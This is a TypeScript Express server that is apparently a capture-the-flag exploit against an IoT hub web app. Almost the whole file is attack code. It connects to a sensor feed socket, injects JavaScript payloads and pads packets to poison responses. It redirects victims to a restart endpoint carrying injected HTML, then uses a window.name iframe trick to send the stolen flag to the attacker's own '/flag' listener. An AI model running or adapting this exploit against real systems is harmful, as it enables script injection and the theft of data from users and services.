import express from "express";
import { Socket } from "net";
import { PromiseSocket } from "promise-socket";
import { readFile } from "fs/promises";
import morgan from "morgan";

const { TARGET_IP, SENSOR_PORT, SENSOR_TOKEN } = process.env;
const packetSize = 1448;
const SELF = "whatevermyipis:12345";
const TARGET = "iot.hub";

const payload = [
	"document.body.innerHTML+=window.name",
	"window.parent.location=window.name+window.parent.document.body.lastElementChild.contentWindow.document.body.firstChild.innerText"
];

const windowName = `<iframe name="http://${SELF}/flag?flag=" src="/"></iframe><iframe src="/cgi-bin/flag"></iframe>`;

const redirectTargets = [
	{ from: "/data/index.html", to: "data.txt" },
	{ from: "/main.js", to: "data" }
];

const socket = new PromiseSocket(new Socket());

const socketOk = async () => {
	let data = await socket.read();
	if (!data?.toString().includes("ok\n")) {
		await socketOk();
	}
};

const app = express();

app.use((req, res, next) => {
	console.log("processing", req.url);
	next();
});

app.use(morgan("dev"));

let phase = 0;

app.get("/flag", (req, res) => {
	console.log(req.query.flag);
	res.send("pwn'd");
});

app.get("/", async (req, res) => {
	if (phase === 0) {
		await init();
	}

	if (phase < redirectTargets.length) {
		const poison =
			`<img src="http://${SELF}/pwn?to=${redirectTargets[phase].to}" />`
			+ `<iframe src="/data/data.txt?${phase}"></iframe>`
			+ `<iframe src="?sensor=a"></iframe>`
			+ `<iframe src="?sensor=b"></iframe>`
			+ `<iframe src="?sensor=c"></iframe>`
			+ `<iframe src="?sensor=d"></iframe>`
			+ `<iframe src="?sensor=e"></iframe>`
			+ `<iframe src="${redirectTargets[phase].from}"></iframe>`
			+ `<meta http-equiv="refresh" content="0;http://${SELF}">`;

		console.log(poison.length, poison);
		res.redirect(`http://${TARGET}/cgi-bin/restart?sensor=${encodeURIComponent(poison)}`);
	} else {
		res.send(`
			<script>
				window.name = '${windowName}';
				window.location = "http://${TARGET}/jst/index.jst";
			</script>
		`);
	}

	phase++;
});

app.get("/pwn", async (req, res) => {
	const to = req.query.to as string;
	console.log("sploitin'");
	await push([["http", "301"], ["location", to], ["a", "1".repeat(packetSize - 44 - to.length)]]);
	res.status(200).send();
});

async function push(fields: [string, string][]) {
	for (let [key, value] of fields) {
		socket.write(`${key}: ${value}\n`);
	}
	socket.write("\n");
	await socketOk();
}

async function pushBytes(n: number, name?: string) {
	console.log("going to write", n - 23);
	await push([[name ?? "a", "1".repeat(n - 23)]]);
}

async function advancePacket(name?: string) {
	await pushBytes(packetSize, name);
}

async function advanceManyPackets(n: number) {
	await pushBytes(packetSize * n);
}

async function init() {
	console.log("called init, setting up sensor feed");

	await socket.connect(parseInt(SENSOR_PORT!, 10), TARGET_IP);

	console.log("connected");

	await socket.read();
	await socket.write(SENSOR_TOKEN! + "\n");
	await socket.read();
	await push([
		...payload.map((pl, i) => [String.fromCharCode(0x61 + i), pl] as [string, string]),
		[String.fromCharCode(0x61 + payload.length), "1".repeat(packetSize - payload.reduce((a, b) => a + b.length + 4, 0) - 23)]
	]);
	await advancePacket("a");
	await advancePacket("b");
	await advancePacket("c");
	await advancePacket("d");
	await advancePacket("e");
	await advancePacket("f");
	await advanceManyPackets(300);

	console.log("ready!");
}

async function run() {
	app.listen(12345);
}

run();
